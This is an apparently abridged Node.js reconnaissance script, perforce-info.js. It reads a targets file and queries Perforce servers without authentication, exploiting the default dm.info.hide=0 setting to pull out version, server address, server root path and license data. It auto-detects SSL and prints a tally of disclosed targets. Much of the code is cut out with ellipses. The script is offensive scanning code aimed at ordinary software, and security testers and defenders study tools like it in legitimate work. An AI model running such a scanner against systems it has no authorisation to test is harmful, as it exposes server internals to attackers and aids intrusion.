// perforce-info.js
// Extracts server information from Perforce servers without authentication.
// Exploits the default configuration (dm.info.hide=0).
// Extracted fields: version, server address, server root path, license.
//
// Usage: node perforce-info.js [targets_file]
// Default targets file: targets.txt
// Targets format: host:port (one per line, port defaults to 1666 if omitted)
//
// Auto-detects: SSL vs plain TCP. (Server info is always ASCII-safe; no unicode retry needed.)
...
const stats = { total: 0, found: 0, errors: 0 };
...
// Returns: { packets, sslNeeded, error }
function queryServer(host, port, useSSL) {
    return new Promise((resolve) => {
        ...
        const p2 = buildPacket([
            ...
            ['charset','1'],['utf8bom','1'],['clientCase','0'],['func','user-info']
        ]);

        const payload = Buffer.concat([p1, p2]);
        ...
        } catch(e) { return resolve({ packets: [], sslNeeded: false, error: e.message }); }
        ...
        sock.on('data', (chunk) => {
            if (firstData && !useSSL && (chunk[0] === 0x15 || chunk[0] === 0x16)) {
                firstData = false;
                return finish({ packets: [], sslNeeded: true, error: null });
            }
            firstData = false;
            ...
            for (const pkt of r.packets) {
                ...
                if (f.includes('ssl')) return finish({ packets: [], sslNeeded: true, error: null });
            }

            if (chunk.includes(RELEASE_MARKER)) {
                return finish({ packets: allPackets, sslNeeded: false, error: null });
            }
        });
        ...
        sock.on('close', () => {
            if (!done) {
                ...
                finish({ packets: allPackets, sslNeeded, error: null });
            }
        });

        sock.on('error', (err) => { if (!done) finish({ packets: [], sslNeeded: false, error: err.message }); });
        sock.on('timeout', () => {
            if (!done) {
                const r = parseResponse(buf); allPackets.push(...r.packets);
                finish({ packets: allPackets, sslNeeded: false, error: 'timeout' });
            }
        });
    });
}
...
async function checkTarget(host, port) {
    ...
    let r = await queryServer(host, port, false);
    let useSSL = false;

    if (r.sslNeeded || (r.error && r.packets.length === 0 && r.error !== 'timeout')) {
        r = await queryServer(host, port, true);
        useSSL = true;
    }

    // Merge all client-Message packets into one info object
    const info = {};
    for (const pkt of r.packets) {
    ...
    if (info.serverRoot) {
        ...
        console.log(`[${label}] [${proto}]`);
        if (info.version)    console.log(`  Version    : ${info.version}`);
        if (info.serverAddr) console.log(`  Server Addr: ${info.serverAddr}`);
        if (info.serverRoot) console.log(`  Server Root: ${info.serverRoot}`);
...
async function run(targets) {
    ...
    console.log(`\n[+] Done. ${stats.total} targets | ${stats.found} disclosed | ${stats.errors} errors`);
}
